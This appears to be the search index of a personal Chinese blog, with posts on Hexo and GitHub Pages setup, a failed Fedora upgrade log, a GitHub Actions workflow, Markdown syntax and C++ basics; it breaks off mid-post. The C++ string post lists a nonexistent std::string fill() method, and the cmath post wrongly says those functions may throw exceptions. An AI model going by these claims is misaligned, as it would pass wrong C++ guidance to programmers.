[{"title":"hello world!","url":"/2020/01/01/12%E2%81%8412/","content":"hello world!","categories":["blog"],"tags":["hello world!"]},{"title":"Hexo零基础搭建个人博客","url":"/2020/01/01/Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/","content":"Hexo零基础搭建个人博客Hexo是一个基于 node.js的快速生成静态博客的开源框架,支持 Markdown和大多数 Octopress插件,一个命令即可部署到 Github页面、 Giteee、 Heroku等,强大的APl,可无限扩展,拥有数百个主题和插件。\n简单来说就是一个不用你写代码，就能搭建一套属于你自己的个人博客网站 应用（零基础小白也会）。\n你可以在上面编写文章，做笔记，写日记，码代码。（一个属于你的世界！一个可供别人访问的个人世界）\n另外Hero还提供了大量主题模版供用户下载。你的博客网站将可以时不时的换一种主题风格，赏心悦目，简直完美！\n环境准备1、安装Node.js2、安装Git\n开始安装Hexonpm install -g hexo-cli\n初始化hexo，新建存储博客的文件夹\nhexo init blog\n进入文件夹，安装一下npm\ncd blog\n\nnpm install\n启动服务站点\nhexo g\n\nhexo server\n访问http://localhost:4000/ \n将hexo博客站点上传到github上这里需要安装一个hexo的上传插件deploy-git\nnpm install hexo-deployer-git --save\n 修改hexo配置文件指定仓库路径可在文件夹中直接打开文件，也可通过vim直接编辑找到Deployment加上（注意空格）\ndeploy:  type: git  repo: 你的仓库路径  branch: master\n推送hexo站点文件hexo g\n推送过程中需要输入你的github用户名和密码。但是在2021年8月14日开始github官方就加强安全访问。不能通过原有账号密码git访问，密码需要用官方的token或者采用ssh公私钥访问。否则会出现下图：鉴权失败（用户名密码错误）\n官方原话：近年来，GitHub 客户受益于 GitHub.com 的许多安全增强功能，例如双因素身份验证、登录警报、经过验证的设备、防止使用泄露密码和 WebAuthn 支持。 这些功能使攻击者更难获取在多个网站上重复使用的密码并使用它来尝试访问您的 GitHub 帐户。 尽管有这些改进，但由于历史原因，未启用双因素身份验证的客户仍能够仅使用其GitHub 用户名和密码继续对 Git 和 API 操作进行身份验证。从 2021 年 8 月 13 日开始，我们将在对 Git 操作进行身份验证时不再接受帐户密码，并将要求使用基于令牌（token）的身份验证，例如个人访问令牌（针对开发人员）或 OAuth 或 GitHub 应用程序安装令牌（针对集成商） GitHub.com 上所有经过身份验证的 Git 操作。 您也可以继续在您喜欢的地方使用 SSH 密钥\n解决方式就是获取token，登录github设置setting-&gt;Developer Settings-&gt;Prosonal access tokens 创建一个新token。然后就可以拿这个token当密码输入了。用户名和token输入后，上传成功。输入你的仓库名称,即可访问成功。https:&#x2F;&#x2F;你的仓库名称.github.io&#x2F;\n更换主题博客样式太死板，想换成属于自己的风格，没问题我们可以更换博客的主题，来达到我们想要的风格。到GitHub上搜索hexo主题或者hero自带的主题https://hexo.io/themes/ 按照各自的主题文档上面一步步操作即可。\n","categories":["hexo"],"tags":["blog","hexo"]},{"title":"fedora更新 悲","url":"/2023/04/29/fedora37to38/","content":"[xuchengxi@fedora 下载]$ sudo dnf system-upgrade download --releasever=38[sudo] xuchengxi 的密码：Before you continue ensure that your system is fully upgraded by running &quot;dnf --refresh upgrade&quot;. Do you want to continue [y/N]: yCopr repo for onedriver owned by jstaf                                        245  B/s | 3.3 kB     00:13    Fedora 38 - x86_64                                                            1.7 kB/s | 5.6 kB     00:03    Fedora 38 - x86_64 - Debug                                                    471  B/s | 4.6 kB     00:10    Fedora 38 - Source                                                            2.9 kB/s | 5.3 kB     00:01    Fedora 38 openh264 (From Cisco) - x86_64                                      300  B/s | 989  B     00:03    Fedora 38 openh264 (From Cisco) - x86_64 - Debug                              595  B/s | 997  B     00:01    Fedora Modular 38 - x86_64                                                    1.0 kB/s | 5.5 kB     00:05    Fedora Modular 38 - x86_64 - Debug                                            934  B/s | 4.6 kB     00:05    Fedora Modular 38 - Source                                                    913  B/s | 5.2 kB     00:05    Fedora 38 - x86_64 - Updates                                                   11 kB/s | 6.0 kB     00:00    Fedora 38 - x86_64 - Updates                                                  152 kB/s | 500 kB     00:03    Fedora 38 - x86_64 - Updates - Debug                                          9.9 kB/s | 5.3 kB     00:00    Fedora 38 - x86_64 - Updates - Debug                                          3.2 kB/s | 4.9 kB     00:01    Fedora 38 - Updates Source                                                     15 kB/s | 5.8 kB     00:00    Fedora 38 - Updates Source                                                    1.6 kB/s | 5.9 kB     00:03    Fedora Modular 38 - x86_64 - Updates                                          1.1 kB/s | 5.4 kB     00:04    Fedora Modular 38 - x86_64 - Updates - Debug                                  8.6 kB/s | 4.4 kB     00:00    Fedora Modular 38 - Updates Source                                            5.7 kB/s | 5.2 kB     00:00    FZUG fc38 - Free                                                              8.6 kB/s | 3.0 kB     00:00    FZUG fc38 - Nonfree                                                            11 kB/s | 3.0 kB     00:00    google-chrome                                                                 2.5 kB/s | 1.3 kB     00:00    microsoft-edge                                                                1.9 kB/s | 1.5 kB     00:00    RPM Fusion for Fedora 38 - Free                                               1.0 kB/s |  11 kB     00:10    RPM Fusion for Fedora 38 - Free - Updates                                     586  B/s | 9.5 kB     00:16    RPM Fusion for Fedora 38 - Nonfree                                            3.0 kB/s |  15 kB     00:04    RPM Fusion for Fedora 38 - Nonfree - Updates                                  7.7 kB/s |  13 kB     00:01    WineHQ packages                                                               2.1 kB/s | 3.0 kB     00:01    没有和组 &quot;gimp-heif-plugin&quot; 匹配的没有和组 &quot;hanazono-fonts&quot; 匹配的没有和组 &quot;vlgothic-p-fonts&quot; 匹配的没有和组 &quot;google-noto-looped-lao-ui-vf-fonts&quot; 匹配的没有和组 &quot;google-noto-sans-myanmar-ui-vf-fonts&quot; 匹配的没有和组 &quot;scim-bridge-gtk&quot; 匹配的没有和组 &quot;drehatlas-warender-bibliothek-fonts&quot; 匹配的没有和组 &quot;google-noto-serif-nyiakeng-puachue-hmong-vf-fonts&quot; 匹配的没有和组 &quot;google-noto-sans-oriya-ui-vf-fonts&quot; 匹配的没有和组 &quot;sil-scheherazade-fonts&quot; 匹配的没有和组 &quot;google-noto-sans-kannada-ui-vf-fonts&quot; 匹配的没有和组 &quot;vlgothic-fonts&quot; 匹配的没有和组 &quot;google-noto-sans-malayalam-ui-vf-fonts&quot; 匹配的没有和组 &quot;google-noto-sans-khmer-ui-vf-fonts&quot; 匹配的没有和组 &quot;google-noto-sans-telugu-ui-vf-fonts&quot; 匹配的没有和组 &quot;google-noto-looped-thai-ui-vf-fonts&quot; 匹配的没有和组 &quot;google-noto-sans-sinhala-ui-vf-fonts&quot; 匹配的没有和组 &quot;drehatlas-xaporho-fonts&quot; 匹配的没有和组 &quot;google-noto-sans-thai-ui-vf-fonts&quot; 匹配的没有和组 &quot;google-noto-serif-tamil-slanted-vf-fonts&quot; 匹配的没有和组 &quot;ipa-ex-gothic-fonts&quot; 匹配的没有和组 &quot;yanone-tagesschrift-fonts&quot; 匹配的没有和组 &quot;google-noto-sans-tamil-ui-vf-fonts&quot; 匹配的没有和组 &quot;google-noto-serif-dogra-vf-fonts&quot; 匹配的没有和组 &quot;reiserfs-utils&quot; 匹配的没有和组 &quot;tlomt-junction-fonts&quot; 匹配的没有和组 &quot;cups-bjnp&quot; 匹配的没有和组 &quot;scim-anthy&quot; 匹配的没有和组 &quot;google-noto-sans-hebrew-droid-vf-fonts&quot; 匹配的没有和组 &quot;ht-caladea-fonts&quot; 匹配的没有和组 &quot;ubuntu-title-fonts&quot; 匹配的没有和组 &quot;authselect-compat&quot; 匹配的没有和组 &quot;google-noto-looped-thai-vf-fonts&quot; 匹配的没有和组 &quot;culmus-shofar-fonts&quot; 匹配的没有和组 &quot;vollkorn-fonts&quot; 匹配的没有和组 &quot;google-noto-sans-lao-ui-vf-fonts&quot; 匹配的没有和组 &quot;google-noto-looped-lao-vf-fonts&quot; 匹配的没有和组 &quot;google-noto-sans-hebrew-new-vf-fonts&quot; 匹配的没有和组 &quot;google-noto-sans-bengali-ui-vf-fonts&quot; 匹配的没有和组 &quot;google-noto-kufi-arabic-vf-fonts&quot; 匹配的没有和组 &quot;google-noto-sans-tai-viet-vf-fonts&quot; 匹配的没有和组 &quot;cave9-mutante-fonts&quot; 匹配的没有和组 &quot;imsettings-systemd&quot; 匹配的没有和组 &quot;google-noto-sans-display-vf-fonts&quot; 匹配的没有和组 &quot;plasma-workspace-xorg&quot; 匹配的没有和组 &quot;google-noto-sans-gurmukhi-ui-vf-fonts&quot; 匹配的没有和组 &quot;google-noto-serif-display-vf-fonts&quot; 匹配的没有和组 &quot;google-noto-sans-zanabazar-square-vf-fonts&quot; 匹配的没有和组 &quot;scim-bridge-qt3&quot; 匹配的没有和组 &quot;scim-bridge-qt&quot; 匹配的没有和组 &quot;google-noto-sans-arabic-ui-vf-fonts&quot; 匹配的没有和组 &quot;google-noto-sans-tamil-supplement-vf-fonts&quot; 匹配的没有和组 &quot;google-noto-sans-runic-vf-fonts&quot; 匹配的没有和组 &quot;polarsys-b612-sans-fonts&quot; 匹配的没有和组 &quot;ipa-ex-mincho-fonts&quot; 匹配的没有和组 &quot;kanjistrokeorders-fonts&quot; 匹配的错误： 问题 1: 安装的软件包的问题 iptables-nft-1.8.8-4.fc37.x86_64  - 软件包 kernel-lt-5.4.228-1.el7.elrepo.x86_64 与 iptables &lt; 1.3.2-1（由 iptables-nft-1.8.9-2.fc38.x86_64 提供）冲突  - iptables-nft-1.8.8-4.fc37.x86_64 不属于 distupgrade 仓库  - 安装的软件包的问题 kernel-lt-5.4.228-1.el7.elrepo.x86_64 问题 2: 安装的软件包的问题 libswscale-free-5.1.3-1.fc37.x86_64  - 软件包 ffmpeg-libs-6.0-6.fc38.x86_64 与 libswscale-free（由 libswscale-free-6.0-2.fc38.x86_64 提供）冲突  - 软件包 ffmpeg-libs-6.0-6.fc38.x86_64 与 libswscale-free（由 libswscale-free-6.0-4.fc38.x86_64 提供）冲突  - 软件包 ffmpeg-6.0-6.fc38.x86_64 需要 ffmpeg-libs(x86-64) = 6.0-6.fc38，但没有提供者可以被安装  - libswscale-free-5.1.3-1.fc37.x86_64 不属于 distupgrade 仓库  - 冲突的请求\n","categories":["linux"],"tags":["linux","fedora","翻车"]},{"title":"github_action翻车记录","url":"/2023/01/31/github_action/","content":"这是我的配置文件\nname: 自动部署# 当有改动推送到master分支时，启动Actionon:  push:    branches:      - main  release:    types:      - publishedjobs:  deploy:    runs-on: ubuntu-latest    steps:      - name: 检查分支        uses: actions/checkout@v2        with:          ref: main      - name: 安装 Node        uses: actions/setup-node@v1        with:          node-version: &quot;19.x&quot;      - name: 安装 Hexo        run: |          export TZ=&#x27;Asia/Shanghai&#x27;          npm install hexo-cli -g      - name: 缓存 Hexo        id: cache-npm        uses: actions/cache@v3        env:          cache-name: cache-node-modules        with:          path: node_modules          key: $&#123;&#123; runner.os &#125;&#125;-build-$&#123;&#123; env.cache-name &#125;&#125;-$&#123;&#123; hashFiles(&#x27;**/package-lock.json&#x27;) &#125;&#125;          restore-keys: |            $&#123;&#123; runner.os &#125;&#125;-build-$&#123;&#123; env.cache-name &#125;&#125;-            $&#123;&#123; runner.os &#125;&#125;-build-            $&#123;&#123; runner.os &#125;&#125;-      - name: 安装依赖        if: $&#123;&#123; steps.cache-npm.outputs.cache-hit != &#x27;true&#x27; &#125;&#125;        run: |          npm install gulp-cli -g #全局安装gulp          npm install --save      - name: 生成静态文件        run: |          hexo clean          hexo g      - name: 部署到Github        uses: JamesIves/github-pages-deploy-action@v4        with:          token: 别想看了          repository-name: xcx2006/xcx2006.github.io          branch: main          folder: public          commit-message: &quot;$&#123;&#123; github.event.head_commit.message &#125;&#125; Updated By Github Actions&quot;\n好不容易才把github action配置好，结果发现之前的博客文章没有标注时间的全部都乱了。原因：有一部分偷懒没标注时间。同步到仓库后默认时间全部都变动了。只能重新添加时间&#x3D;(\n","categories":["github"],"tags":["hexo","翻车","github"]},{"title":"新年快乐!","url":"/2023/01/21/happy/","content":"","tags":["新年"]},{"title":"md语法","url":"/2022/09/03/md%E8%AF%AD%E6%B3%95/","content":"md语法一、标题　　一般使用 # 来进行层级标识。共 6 个层级，再多不识别。\n　　#  =&gt; h1;　　## =&gt; h2;　　### =&gt; h3;　　#### =&gt; h4;　　##### =&gt; h5;　　###### =&gt; h6;\n　　注：h1 级别会默认带一个 \n二、分隔线　　至少三个 * 或 - 或 _ ，有空格也可以，不必连续。\n三、换行　　两个空格 + 一个回车。\n四、代码12345\ncode code code    code code code    code\n　　即首尾各多行  &#96;&#96;&#96; 。\n五、引用　　符号是 &gt; ，引用里可以套引用，理论上无限嵌套。如：\n&gt; 一级&gt;&gt; 二级&gt;&gt;&gt; 三级&gt;&gt;&gt;&gt; 四级\n\n\n\n\n\n六、强调　　* 文本1 * 或 _ 文本1 _ 　　斜体；　　** 文本2 ** 或者 __ 文本2 __ 　　加重强调；　　*** 文本3 *** 或者 ___ 文本3 ___ 　　特别强调；\n\n七、链接　　格式：[页面文字](链接地址)，如：[百度](https://www.baidu.com/)；　　但是，md 中链接不支持 _blank，所以个人的写法还是直接写成： &lt;a href=&quot;www.baidu.com&quot; target=&quot;_blank&quot;&gt;百度xx&lt;/a&gt; ；\n\n\n八、列表　　有序列表（注意，’ . ‘ 后面要跟一个空格）：\n1. xxxx2. xxxxx3. xxxx\n　　无序列表（注意，’ * ‘ 后面要跟一个空格）：\n* xxxx* xxxx* xxxxx\n　　也支持嵌套，使用时在嵌套列表前按 tab 或 空格 来缩进,去控制列表的层数。\n九、图片　　和 链接 类似，格式：\n![Alt text](http://xxx.com/path1/path2/abc.png) 。\n","categories":["markdown"],"tags":["blog","markdown"]},{"title":"cmath头文件","url":"/2024/10/19/c%E2%81%84c++/cmath%E8%AF%B4%E6%98%8E/","content":"cmath 是 C++ 标准库中的一个数学库，它提供了一系列用于执行数学运算的函数。这些函数大多是从 C 语言中的 math.h 头文件继承过来的，但 cmath 是 C++ 风格的封装，所有的函数都位于 std 命名空间中。以下是对 cmath 库的一些主要功能的讲解：\n引入库要使用 cmath 库中的函数，你需要在你的 C++ 文件中包含这个头文件：\n#include &lt;cmath&gt;\n\n并且，由于 cmath 中的函数都在 std 命名空间中，你可能需要在使用这些函数时加上 std:: 前缀，或者使用 using namespace std; 来避免重复书写。\n基本数学函数幂和对数函数\nstd::pow(base, exponent)：计算 base 的 exponent 次幂。\nstd::sqrt(x)：计算 x 的平方根。\nstd::log(x)：计算 x 的自然对数（以 e 为底）。\nstd::log10(x)：计算 x 的以 10 为底的对数。\n\n三角函数\nstd::sin(x)：计算 x（以弧度为单位）的正弦值。\nstd::cos(x)：计算 x（以弧度为单位）的余弦值。\nstd::tan(x)：计算 x（以弧度为单位）的正切值。\nstd::asin(x)：计算 x 的反正弦值（返回弧度）。\nstd::acos(x)：计算 x 的反余弦值（返回弧度）。\nstd::atan(x)：计算 x 的反正切值（返回弧度）。\nstd::atan2(y, x)：计算点 (x, y) 的极坐标角度（返回弧度），考虑了所有四个象限。\n\n指数和对数函数（底数不为 e）\nstd::exp(x)：计算 e 的 x 次幂。\nstd::logb(x)：计算 x 的以 2 为底的指数部分（即 log2(x) 的整数部分）。\nstd::ilogb(x)：计算 x 的以 2 为底的指数部分（整数返回）。\nstd::scalbn(x, n)：计算 x * (2^n)。\nstd::scalbnf(x, n)：scalbn 的单精度浮点版本。\nstd::scalbnl(x, n)：scalbn 的长双精度浮点版本。\n\n浮点数的取整和舍入\nstd::ceil(x)：向上取整，返回大于或等于 x 的最小整数。\nstd::floor(x)：向下取整，返回小于或等于 x 的最大整数。\nstd::round(x)：四舍五入到最近的整数。\nstd::trunc(x)：丢弃 x 的小数部分，返回其整数部分。\nstd::fmod(x, y)：计算 x 除以 y 的余数，结果有相同的符号作为 x。\nstd::remainder(x, y)：计算 x 除以 y 的 IEEE 754 余数。\n\n绝对值和其他函数\nstd::abs(x)：计算 x 的绝对值。对于整数和浮点数有不同的重载版本。\nstd::fabs(x)：计算浮点数 x 的绝对值（std::abs 的浮点版本）。\nstd::signbit(x)：检查 x 的符号位是否设置（即是否为负数）。\nstd::copysign(x, y)：返回一个与 y 有相同符号的 x 的值。\n\n注意事项\n大多数 cmath 函数都会处理其参数范围内的有效值，但对于某些边界情况（如除以零、取负数的平方根等），这些函数可能会返回特定的值（如 std::nan 或 std::inf）或抛出异常。\n使用 cmath 函数时，请注意它们的参数类型（整数还是浮点数），因为不同的类型可能对应不同的重载版本。\n对于涉及浮点数运算的精度问题，要特别小心，因为浮点运算可能会受到计算机表示法的限制。\n\n","categories":["c/c++","c/c++头文件"],"tags":["cpp"]},{"title":"cpp判定","url":"/2024/10/10/c%E2%81%84c++/cpp%20if%E5%88%A4%E5%AE%9A/","content":"在C++中，if 语句用于基于某个条件执行不同的代码块。它的基本语法结构如下：\nif (条件) &#123;    // 如果条件为真，则执行这里的代码&#125;\n\n此外，if 语句还可以与 else 子句结合使用，以便在条件为假时执行另一段代码：\nif (条件) &#123;    // 如果条件为真，则执行这里的代码&#125; else &#123;    // 如果条件为假，则执行这里的代码&#125;\n\nC++ 还提供了 else if 结构，它允许你检查多个条件，并在满足第一个为真的条件时执行相应的代码块：\nif (条件1) &#123;    // 如果条件1为真，则执行这里的代码&#125; else if (条件2) &#123;    // 如果条件1为假但条件2为真，则执行这里的代码&#125; else &#123;    // 如果条件1和条件2都为假，则执行这里的代码&#125;\n\n以下是一个简单的C++程序示例，它使用了 if-else if-else 结构来根据用户输入的分数打印出相应的等级：\n#include &lt;iostream&gt;int main() &#123;    int score;    std::cout &lt;&lt; &quot;请输入你的分数（0-100）: &quot;;    std::cin &gt;&gt; score;    if (score &gt;= 90) &#123;        std::cout &lt;&lt; &quot;等级: A&quot; &lt;&lt; std::endl;    &#125; else if (score &gt;= 80) &#123;        std::cout &lt;&lt; &quot;等级: B&quot; &lt;&lt; std::endl;    &#125; else if (score &gt;= 70) &#123;        std::cout &lt;&lt; &quot;等级: C&quot; &lt;&lt; std::endl;    &#125; else if (score &gt;= 60) &#123;        std::cout &lt;&lt; &quot;等级: D&quot; &lt;&lt; std::endl;    &#125; else &#123;        std::cout &lt;&lt; &quot;等级: F&quot; &lt;&lt; std::endl;    &#125;    return 0;&#125;\n\n在这个程序中，用户被提示输入一个分数，程序会根据输入的分数使用 if-else if-else 结构来确定并打印出相应的等级。\n请注意，if 语句中的条件是一个布尔表达式，它必须返回一个真值（非零值）或假值（零值）。如果条件为真，则执行与 if 关联的代码块；如果为假，并且存在 else 子句，则执行与 else 关联的代码块。如果不存在 else 子句，则程序将继续执行 if 语句之后的代码。\n","categories":["c/c++"],"tags":["cpp"]},{"title":"string说明","url":"/2024/10/10/c%E2%81%84c++/cpp%20string%E7%94%A8%E6%B3%95/","content":"在C++中，std::string 是一个表示和操作字符串的类，定义在 &lt;string&gt; 头文件中。以下是一些常用的 std::string 方法和用法示例：\n1. 包含头文件首先，你需要包含 &lt;string&gt; 头文件：\n#include &lt;string&gt;\n\n2. 创建字符串std::string str1;               // 默认构造函数，创建一个空字符串std::string str2(&quot;Hello&quot;);      // 用C风格字符串初始化std::string str3(str2);         // 用另一个string对象初始化std::string str4(5, &#x27;c&#x27;);       // 用字符和重复次数初始化，结果为 &quot;ccccc&quot;\n\n3. 访问字符串中的字符char ch = str2[0];              // 通过下标访问字符，返回字符的引用char ch2 = str2.at(0);          // 通过at函数访问字符，抛出异常如果下标越界\n\n4. 字符串长度size_t len = str2.length();     // 返回字符串的长度size_t size = str2.size();      // 同 length()\n\n5. 字符串拼接std::string str5 = str2 + &quot; World&quot;;  // 使用 + 运算符拼接字符串str2.append(&quot;!!!&quot;);                  // 使用 append 函数追加字符串str2 += &quot; more text&quot;;                // 使用 += 运算符追加字符串\n\n6. 字符串比较int cmp = str2.compare(str3);       // 比较两个字符串，返回负值、零或正值bool isEqual = (str2 == str3);      // 使用 == 运算符比较两个字符串bool isNotEqual = (str2 != str3);   // 使用 != 运算符比较两个字符串\n\n7. 字符串查找size_t pos = str2.find(&quot;lo&quot;);       // 查找子字符串的位置，返回第一个匹配的位置size_t rpos = str2.rfind(&quot;o&quot;);      // 从右向左查找子字符串的位置size_t fpos = str2.find_first_of(&quot;aeiou&quot;); // 查找第一个元音字符的位置size_t lpos = str2.find_last_of(&quot;aeiou&quot;);  // 查找最后一个元音字符的位置size_t npos = str2.npos;            // 表示未找到的位置（通常是一个很大的值）\n\n8. 字符串替换std::string str6 = &quot;Hello World&quot;;str6.replace(6, 5, &quot;C++&quot;);          // 从索引6开始，替换5个字符为 &quot;C++&quot;\n\n9. 字符串的子串std::string substr = str2.substr(0, 5); // 获取从索引0开始的5个字符的子串\n\n10. 字符串的插入和删除str2.insert(5, &quot;!!!&quot;);              // 在索引5处插入字符串 &quot;!!!&quot;str2.erase(5, 3);                   // 从索引5开始删除3个字符\n\n11. 字符串的转换int num = std::stoi(str2);          // 将字符串转换为整数double dnum = std::stod(str2);      // 将字符串转换为双精度浮点数std::string snum = std::to_string(123); // 将整数转换为字符串\n\n12. 清空字符串str2.clear();                       // 清空字符串\n\n13. 字符串的拷贝std::string str7 = str2.c_str();    // 获取C风格字符串的拷贝（返回 const char*）char arr[20];str2.copy(arr, 20, 0);              // 将字符串内容拷贝到字符数组中，最多拷贝20个字符，从索引0开始\n\n14. 字符串的填充和修改str2.fill(&#x27;x&#x27;);                     // 用字符 &#x27;x&#x27; 填充整个字符串str2.resize(10, &#x27;y&#x27;);               // 调整字符串大小到10个字符，用 &#x27;y&#x27; 填充新位置\n\n这些是 std::string 类中一些常用的方法和功能。C++ 标准库提供了丰富的接口，可以方便地处理字符串的各种操作。\n","categories":["c/c++","c/c++头文件"],"tags":["cpp"]},{"title":"cpp循环用法","url":"/2024/10/10/c%E2%81%84c++/cpp%E5%BE%AA%E7%8E%AF%E7%94%A8%E6%B3%95/","content":"在C++中，循环语句用于重复执行一段代码直到满足特定条件为止。C++ 提供了几种不同类型的循环结构，包括 for 循环、while 循环和 do-while 循环。以下是对这些循环结构的简要介绍和示例：\n1. for 循环for 循环通常用于已知循环次数的情况。它的语法结构如下：\nfor (初始化表达式; 循环条件; 循环迭代) &#123;    // 循环体&#125;\n\n示例：\n#include &lt;iostream&gt;int main() &#123;    for (int i = 0; i &lt; 10; ++i) &#123;        std::cout &lt;&lt; i &lt;&lt; std::endl;    &#125;    return 0;&#125;\n\n在这个例子中，循环将打印从 0 到 9 的整数。\n2. while 循环while 循环在循环开始前检查条件，如果条件为真，则执行循环体。它的语法结构如下：\nwhile (循环条件) &#123;    // 循环体&#125;\n\n示例：\n#include &lt;iostream&gt;int main() &#123;    int i = 0;    while (i &lt; 10) &#123;        std::cout &lt;&lt; i &lt;&lt; std::endl;        ++i;    &#125;    return 0;&#125;\n\n在这个例子中，循环也将打印从 0 到 9 的整数。\n3. do-while 循环do-while 循环与 while 循环类似，但它在循环体执行后才检查条件。这意味着循环体至少会执行一次。它的语法结构如下：\ndo &#123;    // 循环体&#125; while (循环条件);\n\n示例：\n#include &lt;iostream&gt;int main() &#123;    int i = 0;    do &#123;        std::cout &lt;&lt; i &lt;&lt; std::endl;        ++i;    &#125; while (i &lt; 10);    return 0;&#125;\n\n在这个例子中，循环同样将打印从 0 到 9 的整数。\n注意事项\n循环体中的代码将重复执行，直到循环条件变为假（对于 for 和 while 循环）或直到循环体执行后条件变为假（对于 do-while 循环）。\n在 for 循环中，初始化表达式、循环条件和循环迭代都是可选的，但分号和括号是必需的。然而，省略它们通常会导致逻辑错误或无限循环，因此应谨慎使用。\n在使用循环时，务必确保循环能够正常终止，以避免无限循环。这通常意味着要有一个改变循环条件的语句（如递增或递减计数器）。\n在 while 和 do-while 循环中，循环条件通常是一个布尔表达式。如果条件始终为真（例如，没有修改条件的语句），则循环将无限继续。\n\n","categories":["c/c++"],"tags":["cpp"]},{"title":"cpp指针","url":"/2024/10/31/c%E2%81%84c++/cpp%E6%8C%87%E9%92%88/","content":"指针是 C++ 中一种非常重要的概念，它可以让你直接操作内存。下面是指针的详细介绍和常见用法。\n1. 指针的定义指针是一个变量，其值为另一个变量的地址。通过指针，可以间接访问该变量。指针的声明语法如下：\n类型 *指针名;\n\n例如：\nint *p; // p 是一个指向 int 类型的指针\n\n2. 指针的初始化指针必须被初始化后才能使用。可以通过取地址运算符 &amp; 来获取一个变量的地址：\nint a = 10;int *p = &amp;a; // p 指向 a 的地址\n\n3. 解引用指针使用解引用运算符 * 可以访问指针所指向的变量的值：\nint value = *p; // value 现在是 10\n\n4. 指针的算术运算指针可以进行算术运算。例如，如果有一个指针指向一个数组的首元素，可以通过指针加法来访问数组的其他元素：\nint arr[] = &#123;1, 2, 3, 4, 5&#125;;int *p = arr; // p 指向 arr 的首元素// 访问数组元素int first = *p;      // 1int second = *(p + 1); // 2\n\n5. 指向指针的指针指针还可以指向其他指针，形成指向指针的指针（double pointer）：\nint **pp = &amp;p; // pp 是一个指向指针 p 的指针\n\n6. 动态内存分配使用指针可以动态分配内存，常用的有 new 和 delete：\nint *p = new int; // 动态分配一个 int*p = 10;          // 给它赋值delete p;       // 释放内存\n\n对于数组，可以这样：\nint *arr = new int[5]; // 动态分配一个 int 数组delete[] arr;          // 释放数组内存\n\n7. 注意事项\n野指针：未初始化或已经被释放的指针称为野指针，使用野指针会导致未定义行为。\n内存泄漏：动态分配内存后要确保及时释放，避免内存泄漏。\n\n","categories":["c/c++"],"tags":["cpp"]},{"title":"fstream头文件","url":"/2024/10/22/c%E2%81%84c++/fstream%E8%AF%B4%E6%98%8E/","content":"fstream 是 C++ 标准库中的一个类，它用于文件的输入输出操作。fstream 继承自 istream 和 ostream 类，因此它既可以用于读取文件，也可以用于写入文件。以下是关于 fstream 的详细解释：\n一、fstream 的功能fstream 类提供了对文件进行读写操作的功能。通过创建 fstream 类的对象，并调用其成员函数，可以方便地打开文件、读取文件内容、向文件写入数据，以及关闭文件。\n二、fstream 的成员函数fstream 类继承了许多来自 istream 和 ostream 类的成员函数，这些函数用于文件的读写操作。以下是一些常用的成员函数：\n\n**open()**：打开文件。该函数接受文件名和打开模式作为参数，并返回一个布尔值，表示文件是否成功打开。\n**close()**：关闭文件。关闭文件后，将释放与文件相关的资源，并且无法再进行读写操作。\n**is_open()**：检查文件是否已打开。如果文件已打开，则返回 true；否则返回 false。\n**read()**：从文件中读取数据。该函数接受一个字符数组和要读取的字符数作为参数，并将读取的数据存储在数组中。\n**write()**：向文件中写入数据。该函数接受一个字符数组和要写入的字符数作为参数，并将数组中的数据写入文件。\nseekg() 和 **seekp()**：定位文件指针。seekg() 用于定位输入文件指针，而 seekp() 用于定位输出文件指针。这两个函数可以接受一个长整型值和一个可选的查找方向作为参数。\n\n三、fstream 的打开模式\nios::in：以读取模式打开文件。如果文件不存在，则打开操作将失败。\nios::out：以写入模式打开文件。如果文件不存在，则会创建该文件；如果文件已存在，则会清空其内容。\nios::ate：打开文件后，将文件指针定位到文件末尾。这通常用于在写入数据时追加到文件末尾。\nios::app：以追加模式打开文件。所有写入的数据都将添加到文件末尾，而不会覆盖现有内容。\nios::trunc：如果文件已存在，则在打开文件之前清空其内容。这通常与 ios::out 模式一起使用。\nios::binary：以二进制模式打开文件。在二进制模式下，文件内容将按原样读写，不进行任何转换。\n\n四、使用示例以下是一个简单的示例，演示如何使用 fstream 类进行文件的读写操作：\n#include &lt;iostream&gt;#include &lt;fstream&gt;#include &lt;string&gt;int main() &#123;    // 创建 fstream 对象    std::fstream file;    // 打开文件进行写入操作    file.open(&quot;example.txt&quot;, std::ios::out);    if (!file.is_open()) &#123;        std::cerr &lt;&lt; &quot;Failed to open file for writing&quot; &lt;&lt; std::endl;        return 1;    &#125;    // 向文件写入数据    file &lt;&lt; &quot;Hello, World!\\n&quot;;    file.close(); // 关闭文件    // 打开文件进行读取操作    file.open(&quot;example.txt&quot;, std::ios::in);    if (!file.is_open()) &#123;        std::cerr &lt;&lt; &quot;Failed to open file for reading&quot; &lt;&lt; std::endl;        return 1;    &#125;    // 从文件读取数据    std::string line;    if (std::getline(file, line)) &#123;        std::cout &lt;&lt; &quot;Read from file: &quot; &lt;&lt; line &lt;&lt; std::endl;    &#125;    file.close(); // 关闭文件    return 0;&#125;\n\n在这个示例中，我们首先创建了一个 fstream 对象，并使用 open() 函数以写入模式打开了一个名为 example.txt 的文件。然后，我们向文件中写入了一条消息，并关闭了文件。接下来，我们再次打开该文件，这次是以读取模式打开的。我们使用 std::getline() 函数从文件中读取了一行数据，并将其打印到标准输出上。最后，我们关闭了文件。\n","categories":["c/c++","c/c++头文件"],"tags":["cpp"]},{"title":"iomanip头文件","url":"/2024/10/15/c%E2%81%84c++/iomanip%E8%AF%B4%E6%98%8E/","content":"iomanip 是 C++ 标准库中的一个头文件，它提供了一系列用于格式化输入输出的操纵器（manipulators）。这些操纵器允许你控制浮点数的精度、整数的格式、填充字符、宽度等。以下是一些常用的 iomanip 操纵器及其用法：\n1. setprecision用于设置浮点数的显示精度（总有效数字位数或小数点后的位数，具体取决于 fixed 或 scientific 操纵器）。\n#include &lt;iostream&gt;#include &lt;iomanip&gt;int main() &#123;    double num = 123.456789;    std::cout &lt;&lt; &quot;Default precision: &quot; &lt;&lt; num &lt;&lt; std::endl;    std::cout &lt;&lt; &quot;Precision 3: &quot; &lt;&lt; std::setprecision(3) &lt;&lt; num &lt;&lt; std::endl;    std::cout &lt;&lt; &quot;Precision 5: &quot; &lt;&lt; std::setprecision(5) &lt;&lt; num &lt;&lt; std::endl;    return 0;&#125;\n\n2. fixed 和 scientificfixed 使得浮点数以定点表示法显示（即总是显示小数点），而 scientific 以科学计数法显示。\n#include &lt;iostream&gt;#include &lt;iomanip&gt;int main() &#123;    double num = 123.456789;    std::cout &lt;&lt; &quot;Default: &quot; &lt;&lt; num &lt;&lt; std::endl;    std::cout &lt;&lt; &quot;Fixed: &quot; &lt;&lt; std::fixed &lt;&lt; num 